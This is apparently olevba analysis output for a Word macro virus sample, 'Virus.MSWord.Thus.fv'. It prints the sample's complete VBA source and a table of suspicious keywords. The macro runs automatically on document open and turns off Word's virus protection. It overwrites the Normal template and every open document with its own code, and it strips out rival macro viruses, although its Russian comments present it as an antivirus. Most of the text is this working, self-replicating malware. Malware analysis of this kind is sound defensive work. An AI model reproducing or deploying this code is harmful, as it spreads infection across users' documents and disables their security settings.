olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.fv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.fv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
'kill'
' Этот антивирус против вируса Anti-Smyser должен работать:)
    On Error Resume Next
    Application.Options.VirusProtection = False
'Операции записи антивируса
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'kill'" Then
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'kill'" Then
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
    
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
        End If
    Next k
    
    
'Работа антивируса с основным шаблоном
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents.Item(I).Name = "MacroBle" Then ble = True Else ble = False
        If NormalTemplate.VBProject.VBComponents.Item(I).Name = "TheSecond" Then se = True Else se = False
        If NormalTemplate.VBProject.VBComponents.Item(I).Name = "groove" Then gro = True Else gro = False
    Next I
    If ble Then
        NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents.Item("MacroBle")
    End If
    If se Then
        NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents.Item("TheSecond")
    End If
    If gro Then
        NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents.Item("groove")
    End If


'Работа антивируса с открытыми документами
    For h = 1 To Application.Documents.Count
        Application.Documents.Item(h).Activate
        For I = 1 To NormalTemplate.VBProject.VBComponents.Count
            If ActiveDocument.VBProject.VBComponents.Item(I).Name = "MacroBle" Then blea = True Else blea = False
            If ActiveDocument.VBProject.VBComponents.Item(I).Name = "TheSecond" Then sea = True Else sea = False
            If ActiveDocument.VBProject.VBComponents.Item(I).Name = "groove" Then groa = True Else groa = False
        Next I
        If blea Then
            ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents.Item("MacroBle")
        End If
        If sea Then
            ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents.Item("TheSecond")
        End If
        If groa Then
            ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents.Item("groove")
        End If
    Next h
End Sub















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

